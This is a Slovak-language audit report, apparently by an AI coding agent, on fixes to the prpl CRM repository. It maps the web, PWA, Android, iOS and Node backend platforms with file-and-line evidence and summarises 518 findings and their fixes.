# REPORT — audit a opravy prpl CRM (repozitár notion-app)

Dátum: 3. 10. 2026 · Vetva s opravami: `claude/audit-fixes` (lineárne nad `main` @ `7ae8aae`) · Jazyk: slovenčina

> Repozitár `notion-app` je produkt **prpl CRM** (predtým purple-crm, doména prplcrm.eu). Staré názvy v kóde som zámerne nemenil (zoznam je v kapitole 6).

> **Dve vlny opráv.** V prvej (commity do `a0c9fbe`) som podľa zadania opravoval len bezpečné veci a autentifikáciu, DB schému, platby, nasadenie, závislosti a natívne appky som len nahlásil. Potom vlastník pokyn „Poď na všetko čo navrhuješ, všetky opravy“ tieto obmedzenia **zrušil** — v druhej vlne (84 commitov po `a0c9fbe`) sú opravené aj nálezy z autentifikácie, platieb (Stripe, Apple IAP), DB indexov/schémy, nasadenia (render.yaml) a natívnych appiek. Naďalej platí: žiadne nové npm balíčky ani zmeny verzií v package.json, žiadne tajomstvá v kóde ani v reporte, žiadne premenovanie.

> Kapitola 3 obsahuje už len vedome neopravené zvyšky s dôvodom; kapitola 7 akcie, ktoré musí urobiť prevádzka (env premenné, kontrola dát pred novým unique indexom, vydanie natívnych appiek).

## 1. Platformy, na ktorých systém beží

Zistené z repozitára (súbory a riadky v 1.1). Capacitor, Cordova, Electron, Tauri ani Mac Catalyst sa v repozitári nenachádzajú; jediná zmienka o Capacitore je komentár v `ios/PrplCRM/ContentView.swift:295`.

1. **Webový prehliadač – desktop (React SPA, Render static site prplcrm.eu)**
2. **Mobilný prehliadač (iOS Safari, Android Chrome, in-app prehliadače)**
3. **Nainštalovaná PWA – standalone (Android Chrome A2HS, iOS „Pridať na plochu“) so service workerom a Web Push**
4. **Android TWA (Trusted Web Activity, Bubblewrap) – staršia distribúcia Play Store, package eu.prplcrm.app, versionCode 2**
5. **Android natívna aplikácia (Kotlin WebView wrapper, Google Play) – eu.prplcrm.app, versionName 1.0.11 / versionCode 212, UA suffix PrplCRM-Android**
6. **iOS natívna aplikácia (Swift/SwiftUI WKWebView wrapper, App Store) – bundle sk.perunelectromobility.prplcrm, App Store id6761299370, verzia 1.0.19 (build 79), iOS 16.0+, iPhone + iPad, UA suffix PrplCRM-iOS**
7. **Node.js backend (Express 4, Socket.io 4, Mongoose 9, Stripe, web-push, firebase-admin, APNs HTTP/2) na Render Frankfurt – host perun-crm-api.onrender.com**
8. **Pre-renderované statické stránky (SSG landing + právne stránky) pre crawlery bez JS a Google OAuth verification**

### 1.1 Detail a dôkazy

**Webový prehliadač – desktop (React SPA, Render static site prplcrm.eu)**  
Statický Vite/React 18 build nasadený na Render (Frankfurt) ako služba `prpl-crm`. Všetky API volania idú cross-origin na samostatný Render host (perun-crm-api.onrender.com) s Bearer tokenom. Desktop je jediný kontext, kde sa zobrazuje Web Push toggle (isMobileDevice ho skrýva na mobile). Token na webe je per-tab v sessionStorage; nový tab si ho „požičia“ cez BroadcastChannel. Verzia klienta: client/package.json:3 „1.0.0“ (release sa odvodzuje z VITE_RELEASE_SHA — client/.env.example:5).

- render.yaml:30-36 (type web, runtime static, rootDir client, staticPublishPath dist, región frankfurt)
- render.yaml:43-48 (Cache-Control: /assets/* immutable 1 rok, /* no-cache)
- render.yaml:82-84 (SPA fallback rewrite /* → /index.html)
- client/public/_redirects:12 (SPA fallback 200)
- client/index.html:72 (viewport width=device-width, viewport-fit=cover, interactive-widget=resizes-content)
- client/index.html:349 (module entry /src/main.jsx)
- client/vite.config.js:82-96 (Vite 5 build, manualChunks react-vendor/socket)
- client/src/main.jsx:105-117 (createRoot + BrowserRouter + AuthProvider)
- client/src/utils/platform.js:70-79 (isMobileDevice — všetko mimo UA tokenov telefónov/tabletov = desktop)
- client/src/utils/authStorage.js:9,52-54 (web tab → sessionStorage per tab)
- client/src/context/AuthContext.jsx:44-85 (BroadcastChannel zdieľanie tokenu medzi tabmi)
- client/.env.production:1 (VITE_API_URL = cross-origin API host)
- server/index.js:60-61 (CORS origin default https://prplcrm.eu)
- client/package.json:28-31 (vite ^5, vite-plugin-pwa ^1.2, workbox-window)
- client/.node-version:1 (Node 24 pre build na Renderi)

**Mobilný prehliadač (iOS Safari, Android Chrome, in-app prehliadače)**  
Rovnaký SPA bundle ako desktop; CSS rozlišuje mobil cez šírku a hover:none/pointer:coarse, Android navyše cez body.platform-android. Bez štandalone režimu sa safe-area padding pre header neaplikuje (rieši to prehliadač). iOS Safari v tabe nemá Web Push (len nainštalovaná PWA). Token v sessionStorage (ako desktop).

- client/src/utils/platform.js:74 (regex Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile)
- client/src/main.jsx:28-29 (body.platform-android z navigator.userAgent /Android/i)
- client/src/styles/index.css:787,2287,2449,2706 (breakpointy 768/599/380px)
- client/src/styles/index.css:2754,5164,6221,8177 (@media (hover: none) and (pointer: coarse) — dotykové ovládanie)
- client/src/styles/index.css:351,722 (100dvh s 100vh fallbackom pre staré WKWebView)
- client/src/styles/index.css:2297,3504,5603-5613,8265-8276 (env(safe-area-inset-*))
- client/src/styles/index.css:12292-12295 (.platform-android * { -webkit-tap-highlight-color: transparent })
- client/index.html:14-22 (komentár: in-app prehliadače Gmail/Outlook/LinkedIn majú webkit.messageHandlers → preto detekcia len cez PrplCRM-iOS UA alebo handler iosNative)
- client/src/services/pushNotifications.js:17-24 (Web Push len ak SW + PushManager + Notification; na iOS Safari mimo PWA chýba)
- client/src/components/BottomNav.jsx (spodná navigácia pre mobil; docs/public/mobile.md:22-30)
- client/src/utils/keyboardPrimer.js:1-16 (workaround otvárania klávesnice v iOS WKWebView aj Android WebView)

**Nainštalovaná PWA – standalone (Android Chrome A2HS, iOS „Pridať na plochu“) so service workerom a Web Push**  
Jeden service worker /sw.js pre celý origin (workbox precache + importScripts sw-push.js). Web Push cez VAPID (web-push ^3.6.7). Pri inštalácii sa token ukladá do localStorage. Shortcuts v manifeste + related_applications ukazujú na oba obchody. Push subscription sa automaticky obnovuje v pushsubscriptionchange. V iOS natívnom shelli je SW explicitne zakázaný (viď iOS).

- client/public/manifest.json:5-12 (id /?source=pwa, start_url /, scope /, display standalone, display_override, orientation portrait-primary)
- client/public/manifest.json:13-25 (prefer_related_applications false; related_applications: itunes id 6761299370, play eu.prplcrm.app)
- client/public/manifest.json:26-48 (shortcuts /tasks, /crm, /messages)
- client/index.html:113-119 (theme-color, apple-mobile-web-app-capable, status-bar-style black-translucent, mobile-web-app-capable)
- client/index.html:125-129 (link rel=manifest, apple-touch-icon)
- client/vite.config.js:9-19 (VitePWA registerType autoUpdate, injectRegister inline, manifest:false)
- client/vite.config.js:20-40 (workbox precache, importScripts ['sw-push.js'], skipWaiting, clientsClaim, cleanupOutdatedCaches)
- client/vite.config.js:41-70 (runtimeCaching Google Fonts CacheFirst)
- client/public/sw-push.js:21,110,166,186 (push, notificationclick, notificationclose, pushsubscriptionchange)
- client/public/sw-push.js:75-106 (sanitizácia deep-link URL na vlastný origin, fallback /app)
- client/src/main.jsx:30-32 (body.pwa-standalone z matchMedia display-mode: standalone alebo navigator.standalone)
- client/src/styles/index.css:12278-12290 (.pwa-standalone .crm-header safe-area-inset-top; .pwa-standalone body farba status baru)
- client/src/utils/authStorage.js:12-17,37-54 (PWA/TWA → localStorage, lebo sessionStorage zmizne pri swipe-kill)
- client/src/services/pushNotifications.js:52-58,99-106 (registrácia SW scope + pushManager.subscribe + POST /api/push/subscribe)
- server/routes/push.js:64-68 (GET /vapid-public-key), 72-127 (POST /subscribe), 129 (/unsubscribe), 161 (/test)
- server/services/notificationService.js:47-55 (web-push setVapidDetails)
- server/models/PushSubscription.js:3-37 (endpoint, keys p256dh/auth, userAgent)
- render.yaml:22-27 (VAPID_PUBLIC_KEY/PRIVATE_KEY/SUBJECT env)
- client/scripts/prerender.mjs:178-193 (prepočet workbox revision index.html v dist/sw.js)
- client/dev-dist/sw.js, client/dist/sw.js, client/dist/workbox-1d305bb8.js (trackované SW build artefakty)

**Android TWA (Trusted Web Activity, Bubblewrap) – staršia distribúcia Play Store, package eu.prplcrm.app, versionCode 2**  
Bubblewrap TWA – Chrome bez URL baru, push cez Web Push + delegovaná notifikácia. Podľa android-native/README.md je TWA nahradená natívnym wrapperom (rovnaký package aj keystore, takže v Play Store ide o tú istú appku; TWA bola versionCode 1–99). Pre web klienta TWA vyzerá ako PWA standalone na Androide (display-mode standalone, bez UA suffixu) → body.pwa-standalone + platform-android. Zostáva v repozitári ako build-konfig; používatelia so starou TWA verziou môžu stále existovať (neoverené).

- android/twa-manifest.json:2-5 (packageId eu.prplcrm.app, host prplcrm.eu, name Prpl CRM, launcherName PrplCRM)
- android/twa-manifest.json:14-15 (enableNotifications true, startUrl /app)
- android/twa-manifest.json:23-24,46 (appVersionName 2, appVersionCode 2)
- android/twa-manifest.json:26,28 (generatorApp bubblewrap-cli, fallbackType customtabs)
- android/twa-manifest.json:34-37 (isChromeOSOnly false, isMetaQuest false, fullScopeUrl, minSdkVersion 21)
- android/app/build.gradle:23-51 (twaManifest blok), 54-61 (compileSdk 36, minSdk 21, targetSdk 36, versionCode 2)
- android/app/build.gradle:76-84 (webManifestUrl pre Chrome OS / Meta Quest fallback na web PWA)
- android/app/build.gradle:211 (com.google.androidbrowserhelper:androidbrowserhelper:2.6.2)
- android/app/src/main/AndroidManifest.xml:79-82 (LauncherActivity), 147-155 (intent-filter autoVerify https host), 177-192 (DelegationService TRUSTED_WEB_ACTIVITY_SERVICE – notification delegation)
- android/app/src/main/java/eu/prplcrm/app/LauncherActivity.java:25-26 (extends androidbrowserhelper LauncherActivity)
- android/app/src/main/res/values/strings.xml:32-39 (assetStatements web → https://prplcrm.eu)
- android/app/src/main/res/raw/web_app_manifest.json:1 (kópia web manifestu, start_url /app)
- client/public/.well-known/assetlinks.json:6-10 (package eu.prplcrm.app, 3 SHA256 fingerprinty)
- render.yaml:60-62 (Cache-Control pre assetlinks.json)
- android-native/README.md:3-8,96-100 (TWA „predošlá verzia“ nahradená Kotlin wrapperom; versionCode natívu začína na 100)
- android-native/app/build.gradle.kts:2-6 (rovnaký keystore ako TWA, aby Play prijal update)

**Android natívna aplikácia (Kotlin WebView wrapper, Google Play) – eu.prplcrm.app, versionName 1.0.11 / versionCode 212, UA suffix PrplCRM-Android**  
Plne natívny Kotlin WebView wrapper nad https://prplcrm.eu/app. Detekcia v klientovi cez UA suffix `PrplCRM-Android/<verzia>` alebo `window.NativeBridge`. Push: FCM (data-only payload) cez firebase-admin na serveri; registrácia tokenu natívnym OkHttp POST na API host (nie na prplcrm.eu). Token a workspaceId v hardvérovo šifrovaných EncryptedSharedPreferences a pri každom onPageStarted injektované do localStorage. Google Play „zero-tap sign-in“: obnovovací token v Block Store (prežije reinštaláciu) → POST /api/auth/restore. App Links s autoVerify (vrátane /auth/callback pre OAuth návrat). Sťahovanie súborov cez DownloadManager alebo NativeBridge.saveFile (MediaStore na Android 10+). Biometric závislosť pripravená, ale nepoužitá (manifest bez USE_BIOMETRIC). Store: Google Play id eu.prplcrm.app (client/index.html:225).

- android-native/app/build.gradle.kts:25-33 (namespace/applicationId eu.prplcrm.app, compileSdk 36, minSdk 24, targetSdk 36, versionCode 212, versionName 1.0.11)
- android-native/app/build.gradle.kts:92-115 (androidx.webkit, security-crypto EncryptedSharedPreferences, firebase-bom 33.6.0 + firebase-messaging, biometric 1.1.0 pripravené, okhttp 4.12.0, play-services-auth-blockstore 16.4.0)
- android-native/app/src/main/java/eu/prplcrm/app/MainActivity.kt:354 (userAgentString += " PrplCRM-Android/${BuildConfig.VERSION_NAME}")
- android-native/app/src/main/java/eu/prplcrm/app/MainActivity.kt:499-506 (addJavascriptInterface WebAppInterface ako "NativeBridge" len na našom hoste, inak removeJavascriptInterface)
- android-native/app/src/main/java/eu/prplcrm/app/MainActivity.kt:514-525 (injekcia tokenu + workspaceId z EncryptedSharedPreferences do localStorage v onPageStarted)
- android-native/app/src/main/java/eu/prplcrm/app/MainActivity.kt:215-223 (Google Play zero-tap: RestoreSession.tryRestore z Block Store pri cold starte)
- android-native/app/src/main/java/eu/prplcrm/app/MainActivity.kt:371-391 (setDownloadListener → DownloadManager, host guard)
- android-native/app/src/main/java/eu/prplcrm/app/MainActivity.kt:624 (onShowFileChooser – fotoaparát/súbory)
- android-native/app/src/main/java/eu/prplcrm/app/MainActivity.kt:901-906 (FirebaseMessaging.getInstance().token → FcmRegistrar)
- android-native/app/src/main/java/eu/prplcrm/app/WebAppInterface.kt:26-80 (@JavascriptInterface setAuthToken/getAuthToken/setCurrentWorkspaceId/clearAll), 98 (saveFile base64 → Downloads), 159 (showKeyboard), 177-183 (isNativeApp, getPlatform 'android', getAppVersion)
- android-native/app/src/main/java/eu/prplcrm/app/TokenStore.kt:21-38 (EncryptedSharedPreferences "prpl_secure_prefs", AES256_SIV/GCM)
- android-native/app/src/main/java/eu/prplcrm/app/PrplFcmService.kt:33-72 (FirebaseMessagingService, data-only payload, skip ak appka v popredí)
- android-native/app/src/main/java/eu/prplcrm/app/FcmRegistrar.kt:66-83 (POST {api_base_url}/api/push/fcm/register, body fcmToken/platform android/appVersion/packageName)
- android-native/app/src/main/java/eu/prplcrm/app/RestoreCredentialStore.kt:28-32 (Block Store kľúče eu.prplcrm.app.restore_token / workspace_id)
- android-native/app/src/main/java/eu/prplcrm/app/RestoreSession.kt:52-57,105-108,149-152 (POST /api/auth/restore-token, POST /api/auth/restore, DELETE /api/auth/restore-token)
- android-native/app/src/main/java/eu/prplcrm/app/NativeErrorReporter.kt:13-25 (POST /api/errors/client – natívna telemetria)
- android-native/app/src/main/java/eu/prplcrm/app/PrplApplication.kt:16-37 (notification channel prpl_notifications)
- android-native/app/src/main/AndroidManifest.xml:7-26 (INTERNET, ACCESS_NETWORK_STATE, POST_NOTIFICATIONS, WAKE_LOCK, VIBRATE, WRITE_EXTERNAL_STORAGE maxSdk 28), 34-36 (AD_ID odstránené), 51-58 (queries IMAGE/VIDEO_CAPTURE)
- android-native/app/src/main/AndroidManifest.xml:88-95 (MainActivity singleTask, configChanges pre skladacie telefóny, adjustResize), 111-126 (App Links autoVerify https://prplcrm.eu/{app,tasks,crm,messages,workspace,auth})
- android-native/app/src/main/AndroidManifest.xml:134-142 (FileProvider ${applicationId}.fileprovider), 145-151 (PrplFcmService MESSAGING_EVENT), 155-163 (FCM default channel/icon/color)
- android-native/app/src/main/res/values/strings.xml:7 (webapp_url https://prplcrm.eu/app), 14 (api_base_url https://perun-crm-api.onrender.com), 17 (channel id prpl_notifications)
- android-native/app/src/main/res/xml/data_extraction_rules.xml, android-native/app/src/main/AndroidManifest.xml:63-65 (allowBackup false)
- client/src/utils/platform.js:44-52 (isAndroidNativeApp = /PrplCRM-Android/)
- client/src/utils/nativeBridge.js:26-32 (UA alebo window.NativeBridge.isNativeApp), 58-73 (nativeSetAuthToken/nativeClearAll/nativeSetWorkspaceId)
- client/src/utils/fileDownload.js:6-7,94-100 (NativeBridge.saveFile)
- client/src/utils/authStorage.js:48-52,88-93,108-111 (write-through tokenu do natívnej vrstvy)
- server/routes/push.js:426-457 (POST /fcm/register), 463 (/fcm/unregister), 479 (/fcm/status), 503 (/fcm/test)
- server/models/FcmDevice.js:13-45 (fcmToken unique, platform enum android|android-native, packageName default eu.prplcrm.app)
- server/services/fcmService.js:1-17 (firebase-admin, FIREBASE_SERVICE_ACCOUNT_BASE64/JSON/PATH)
- server/routes/auth.js:446-560 (Block Store restore-token endpointy)
- client/public/.well-known/assetlinks.json:6-10 (Digital Asset Links)
- docs/store-metadata/android-google-play.md:1 (Play listing eu.prplcrm.app)
- docs/superpowers/specs/2026-09-02-play-zero-tap-block-store-design.md (dizajn zero-tap sign-in)
- android-native/README.md:25-26 (Firebase projekt `prpl-crm`, google-services.json v .gitignore)
- android-native/upload_certificate.pem (Play upload certifikát – verejný kľúč, trackovaný)

**iOS natívna aplikácia (Swift/SwiftUI WKWebView wrapper, App Store) – bundle sk.perunelectromobility.prplcrm, App Store id6761299370, verzia 1.0.19 (build 79), iOS 16.0+, iPhone + iPad, UA suffix PrplCRM-iOS**  
SwiftUI appka s jedným WKWebView nad https://prplcrm.eu/app. Detekcia v klientovi cez UA prefix `PrplCRM-iOS/<verzia>.<build>` alebo handler `iosNative`; server rozlišuje iOS podľa UA pre App Store compliance texty (nie bezpečnostný mechanizmus). Service worker je v shelli vypnutý (reload-loop v WKWebView), push ide cez APNs (HTTP/2 natívne, bez knižnice apn). Token v Keychain (service = bundle id) s Face ID/Touch ID zámkom; injekcia do localStorage cez WKUserScript. Natívny OAuth: Sign in with Apple (ASAuthorization) + GoogleSignIn-iOS, výsledok cez POST /api/auth/{provider}/native → window.__nativeAuthLogin. Platby v iOS výhradne cez StoreKit 2 IAP (produkty prplcrm.team/pro.monthly/yearly), web používa Stripe. Universal Links (applinks:prplcrm.eu) + custom schéma prplcrm://auth. Podporuje iPhone aj iPad (device family 1,2), portrét aj landscape; Mac Catalyst vypnutý.

- ios/PrplCRM.xcodeproj/project.pbxproj:213 (IPHONEOS_DEPLOYMENT_TARGET 16.0), 281 (CURRENT_PROJECT_VERSION 79), 293 (MARKETING_VERSION 1.0.19), 294,326 (PRODUCT_BUNDLE_IDENTIFIER sk.perunelectromobility.prplcrm), 297 (SUPPORTED_PLATFORMS iphoneos iphonesimulator), 298 (SUPPORTS_MACCATALYST NO), 301 (TARGETED_DEVICE_FAMILY 1,2), 196 (DEVELOPMENT_TEAM Q4KXURZ973)
- ios/PrplCRM/ContentView.swift:21 (štartovacia URL https://prplcrm.eu/app)
- ios/PrplCRM/ContentView.swift:345-353 (message handlers iosNative, fileDownload, openExternal)
- ios/PrplCRM/ContentView.swift:365-371 (allowsBackForwardNavigationGestures false, bounces false, contentInsetAdjustmentBehavior .never)
- ios/PrplCRM/ContentView.swift:379-381 (customUserAgent "PrplCRM-iOS/<version>.<build> " + default UA)
- ios/PrplCRM/ContentView.swift:394-404 (WKUserScript – token z Keychain do localStorage len ak prázdne)
- ios/PrplCRM/ContentView.swift:409-413 (inject --sat/--sab CSS premenných + document.body.classList.add('ios-app'))
- ios/PrplCRM/ContentView.swift:1100-1111 (natívne safeAreaInsets → --safe-area-top/bottom + .crm-header padding)
- ios/PrplCRM/ContentView.swift:77-140 (LAContext Face ID / Touch ID / passcode lock pri uloženom tokene)
- ios/PrplCRM/ContentView.swift:825-864 (ochrana handlera: senderHost == prplcrm.eu; authToken → Keychain, logout → deleteToken)
- ios/PrplCRM/ContentView.swift:888-958 (Apple IAP bridge: iapGetProducts / iapPurchase / iapRestore → window.__iapProducts/__iapResult)
- ios/PrplCRM/ContentView.swift:1295-1362 (externé hosty cez UIApplication.shared.open, interné prplcrm.eu/localhost v WebView)
- ios/PrplCRM/PrplCRMApp.swift:18-20 (@main SwiftUI App + AppDelegate), 58-107 (onOpenURL: prplcrm://auth?token, Google callback, Universal Links; onContinueUserActivity NSUserActivityTypeBrowsingWeb)
- ios/PrplCRM/PrplCRMApp.swift:112-117 (badge reset pri scenePhase .active)
- ios/PrplCRM/PrplCRMApp.swift:135 (API baseURL https://perun-crm-api.onrender.com), 171 (POST /api/push/apns/register), 329-353 (requestAuthorization, registerForRemoteNotifications, deviceToken hex)
- ios/PrplCRM/PrplCRMApp.swift:256-316 (deep link z APNs payloadu: url, alebo fallback z type/messageId/contactId/taskId/ws)
- ios/PrplCRM/KeychainHelper.swift:6-7,27 (Keychain service = bundle id, account authToken, kSecAttrAccessibleWhenUnlockedThisDeviceOnly)
- ios/PrplCRM/StoreKitManager.swift:1-21 (StoreKit 2; productIds prplcrm.team.monthly/yearly, prplcrm.pro.monthly/yearly), 129-136 (Transaction.updates listener)
- ios/PrplCRM/OAuthController.swift:42 (backendBaseURL), 59 (POST /api/auth/{google|apple}/native), 161-164 (window.__nativeAuthLogin inject), 187-213 (ASAuthorizationAppleIDProvider), 371-385 (GIDSignIn)
- ios/PrplCRM.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/Package.resolved:23-30 (GoogleSignIn-iOS 9.1.0), 14-20 (AppAuth-iOS 2.0.0)
- ios/PrplCRM/Info.plist:21-43 (URL schémy: prplcrm (eu.prplcrm.auth), com.googleusercontent.apps.… (eu.prplcrm.googlesignin)), 46-47 (GIDClientID), 52-58 (ATS: arbitrary loads false, InWebContent true), 59-66 (Camera/FaceID/Microphone/PhotoLibrary usage), 67-70 (UIBackgroundModes remote-notification), 82-95 (portrait + landscape, iPad)
- ios/PrplCRM/PrplCRM.entitlements:5-6 (aps-environment production), 7-10 (Sign in with Apple), 11-14 (associated-domains applinks:prplcrm.eu)
- ios/PrplCRM/PrivacyInfo.xcprivacy:16-46 (privacy manifest; UserDefaults CA92.1)
- ios/PrplCRM/GoogleService-Info.plist:11-12 (BUNDLE_ID)
- client/public/.well-known/apple-app-site-association:6-19 (appID Q4KXURZ973.sk.perunelectromobility.prplcrm; paths /app,/tasks,/crm,/messages,/workspace,/auth/callback)
- render.yaml:52-57 (Content-Type application/json + Cache-Control pre AASA)
- client/index.html:5-66 (inline skript: detekcia iOS shellu, navigator.serviceWorker.register neutralizovaný, unregister + caches.delete, window.__iosNative)
- client/src/utils/platform.js:25-39 (isIosNativeApp = /PrplCRM-iOS/ alebo webkit.messageHandlers.iosNative)
- client/src/utils/nativeBridge.js:18-24,97-118 (nativeStartGoogleSignIn / nativeStartAppleSignIn)
- client/src/components/OAuthButtons.jsx:41-44 (natívny OAuth ak window.__nativeOAuthSupported)
- client/src/pages/AuthCallback.jsx:75-85 (redirect na prplcrm://auth?token=…&returnUrl=…)
- client/src/context/AuthContext.jsx:200-221 (window.__nativeAuthLogin)
- client/src/utils/iapBridge.js:69-71,77-113 (IAP len v iOS shelli, POST /api/billing/apple/verify)
- client/src/App.jsx:534,538 (NotificationToast a PushPermissionBanner skryté v iOS shelli), 555, 597-600 (/app/billing → IapBilling namiesto BillingPage)
- client/src/utils/fileDownload.js:5,80-82 (webkit.messageHandlers.fileDownload → share sheet)
- client/src/styles/index.css:2128-2141 (.ios-app .ios-only/.desktop-only), 5581-5613 (body.ios-app, --safe-area-top)
- client/src/main.jsx:92 (hydratácia landingu preskočená v iOS shelli)
- server/utils/platform.js:22-26 (isIosNativeApp(req) = /PrplCRM-iOS\// v User-Agent)
- server/middleware/workspace.js:274; server/routes/contacts.js:449,556,678,1298,1629-1705,2055-2083; server/routes/messages.js:265; server/routes/googleCalendar.js:223; server/routes/googleTasks.js:227; server/routes/tasks.js:45 (platform-neutral texty limitov pre App Store Guideline 3.1.1)
- server/services/notificationService.js:74-236 (APNs cez natívne HTTP/2, APNS_TOPIC sk.perunelectromobility.prplcrm, sandbox/production auto-detekcia)
- server/models/APNsDevice.js:3-34 (deviceToken unique, bundleId default, apnsEnvironment)
- server/routes/push.js:319-424 (POST /apns/register, /apns/unregister, GET /apns/status, POST /apns/test)
- server/config/appleProducts.js:22-27 (IAP product ↔ plán), server/services/appleIap.js:37 (BUNDLE_ID), server/routes/billingApple.js, server/config/apple-certs/*.cer
- docs/store-metadata/ios-app-store.md:1 (App Store id6761299370), docs/apple-iap-setup.md:30-48 (IAP produkty a ceny)
- client/index.html:224,228,321 (https://apps.apple.com/app/prpl-crm/id6761299370)

**Node.js backend (Express 4, Socket.io 4, Mongoose 9, Stripe, web-push, firebase-admin, APNs HTTP/2) na Render Frankfurt – host perun-crm-api.onrender.com**  
Jediný Node proces (node index.js) obsluhuje REST API, Socket.io a všetky tri push kanály (Web Push desktop/PWA, APNs iOS, FCM Android) + Stripe webhooky a Apple App Store Server Notifications. Beží za Render proxy (trust proxy 1). Produkčný host je stále starý názov perun-crm-api.onrender.com, na ktorý sú naviazané OAuth redirect URI (Google, Apple), Google Calendar webhook, ASSN URL a natívne appky. Súborové prílohy v Cloudflare R2, DB MongoDB (Atlas podľa docs – neoverené z kódu). README.md (riadky 1-131) je zastaraný „Notion Clone“ popis a nezodpovedá produktu.

- render.yaml:3-10 (type web, name prpl-crm-api, runtime node, region frankfurt, rootDir server, buildCommand npm ci --omit=dev, startCommand node index.js, healthCheckPath /health)
- render.yaml:11-27 (NODE_ENV, JWT_SECRET generateValue, CORS_ORIGIN, LOG_LEVEL, MONGODB_URI, VAPID_*)
- server/package.json:13-35 (express ^4.18, socket.io ^4.7, mongoose ^9.0, stripe ^22, web-push, firebase-admin ^13.8, @apple/app-store-server-library, @aws-sdk/client-s3, ioredis, helmet, express-rate-limit, multer, nodemailer, googleapis)
- server/index.js:54-55 (app.set('trust proxy', 1) pre Render)
- server/index.js:59-74 (CORS origin CORS_ORIGIN || https://prplcrm.eu; Socket.io s rovnakým CORS)
- server/index.js:94-120 (helmet CSP; connect-src https/wss://${API_PUBLIC_HOST||perun-crm-api.onrender.com} + prplcrm.eu; crossOriginResourcePolicy cross-origin)
- server/index.js:161 (GET /health), 171 (GET /api/version)
- server/index.js:283-319 (io.use(authenticateSocket); rooms user-/workspace-/page-)
- server/middleware/auth.js (authenticateToken / authenticateSocket – Bearer JWT)
- server/config/database.js (MongoDB pripojenie; docs/cloudflare-r2-setup.md:182 spomína Atlas)
- server/services/fileStorage.js, docs/cloudflare-r2-setup.md (Cloudflare R2 cez S3 SDK pre prílohy)
- server/utils/redisClient.js (ioredis – voliteľný Redis)
- server/services/notificationService.js:47-55 (Web Push VAPID), 74-236 (APNs), 7 (FCM import) – tri push transporty paralelne
- server/routes/push.js (web /subscribe, /apns/*, /fcm/*)
- server/routes/billing.js, server/routes/billingApple.js (Stripe web vs. Apple IAP)
- server/routes/auth-google.js:40, server/routes/auth-apple.js:47, server/routes/googleCalendar.js:26,775, server/routes/googleTasks.js:26 (OAuth redirect/webhook URI na API hoste)
- server/jobs/commissionScheduler.js, server/jobs/errorAlerter.js, server/jobs/healthMonitor.js (in-process cron joby)
- server/__tests__/setup.js, server/package.json:40 (mongodb-memory-server pre testy)
- client/vite.config.js:97-105 (dev proxy /api → localhost:5001), .claude/launch.json:11-17 (server port 5001)
- android-native/app/src/main/res/values/strings.xml:14; ios/PrplCRM/PrplCRMApp.swift:135; client/.env.production:1 (všetci klienti volajú ten istý API host)

**Pre-renderované statické stránky (SSG landing + právne stránky) pre crawlery bez JS a Google OAuth verification**  
Nie je to samostatný runtime, ale distribučný kanál: landing '/' je pri builde pre-renderovaný a hydratovaný; právne stránky existujú ako statické HTML aj ako React routy (PrivacyPolicy.jsx, TermsOfService.jsx). Dôležité pre Google OAuth review a AI/SEO crawlery.

- client/package.json:35 (build = vite build && node scripts/prerender.mjs || true)
- client/scripts/prerender.mjs:1-23 (SSR build entry-server → inject do dist/index.html, route guardy, fail-safe)
- client/scripts/prerender.mjs:35-42 (HEAD_GUARD/POST_ROOT_GUARD – mimo '/' sa prerender skryje a zmaže)
- client/scripts/prerender.mjs:104-172 (critical CSS inline, deferovaný React boot na '/')
- client/src/entry-server.jsx:18-23 (renderToString(<LandingPage/>))
- client/src/main.jsx:87-104 (hydrateRoot landingu, ak nie iOS shell a root nie je prázdny)
- client/public/ochrana-udajov/index.html, client/public/vop/index.html, client/public/ochrana-udajov.html, client/public/vop.html (statické právne stránky)
- render.yaml:63-77 (rewrite /ochrana-udajov → /ochrana-udajov/index.html, /vop → /vop/index.html pred SPA fallbackom)
- client/public/_redirects:9-11 (301 na verzie s lomkou)
- client/public/robots.txt, client/public/sitemap.xml, client/index.html:74-345 (SEO meta + JSON-LD SoftwareApplication/MobileApplication/FAQPage/Organization/WebSite)
- client/public/4dc994641a25fa6d1cdedd30ddd6a5d2.txt (verifikačný token domény, 33 B)

**NEPRÍTOMNÉ platformy: Capacitor, Cordova, Electron, Tauri, macOS (Catalyst), desktop natívne appky**  
Systém nepoužíva žiadny hybridný framework ani desktopový shell. Natívne obaly sú vlastné (Kotlin WebView, Swift WKWebView, Bubblewrap TWA). Desktop sa obsluhuje výhradne cez webový prehliadač / nainštalovanú PWA.

- git grep -i -E 'capacitor|cordova|electron|tauri' → jediný zásah ios/PrplCRM/ContentView.swift:295 (komentár odkazujúci na fix klávesnice, ktorý „Capacitor/Cordova používajú“ – nie závislosť)
- žiadny súbor capacitor.config.*, žiadny priečinok electron/, src-tauri/ (git ls-files – 468 súborov, overené)
- ios/PrplCRM.xcodeproj/project.pbxproj:297-298 (SUPPORTED_PLATFORMS iphoneos iphonesimulator; SUPPORTS_MACCATALYST = NO)
- client/package.json:5-31, server/package.json:13-43, package.json:1-8 (žiadne závislosti @capacitor/*, cordova-*, electron, @tauri-apps/*)

## 2. Zhrnutie

| Metrika | Hodnota |
|---|---|
| Prečítané skupiny súborov (každý riadok) | 23 (13 server, 8 klient, 2 natívne shelly) |
| Kandidáti na nález (po zlúčení duplicít) | 525 |
| Vyvrátení pri nezávislom overení | 7 |
| Platné nálezy | 518 (vysoké 26, stredné 122, nízke 298, info 72) |
| Opravené | 505 nálezov v 369 commitoch (klient 147, server 214, natívne 4, ostatné 4) |
| Bezpečné, ale zámerne neopravené | 1 (dôvody v 4.3) |
| Vedome neopravené (zvyšky) | 12 (vysoké 0, stredné 0, nízke 4, info 8) — dôvody v kapitole 3 |

**Najdôležitejšie opravy** (riadky sú pred opravou, detail v 4.1):

- `server/services/adminEmailService.js:318` — e-mail „Zabudnuté heslo" sa v produkcii nikdy neodoslal (ReferenceError). Opravené ako prvý commit vetvy.
- `client/src/pages/BillingPage.jsx:97` — Stripe Checkout/Portal sa otvára cez window.open po await – Safari/Firefox ho blokujú ako popup
- `ios/PrplCRM/ContentView.swift:398` — Keychain JWT sa cez WKUserScript zapisuje do localStorage KAŽDÉHO originu načítaného v hlavnom frame
- `ios/PrplCRM/ContentView.swift:864` — Po odhlásení ostáva token zapečený v WKUserScript a pri ďalšom plnom načítaní stránky session obnoví
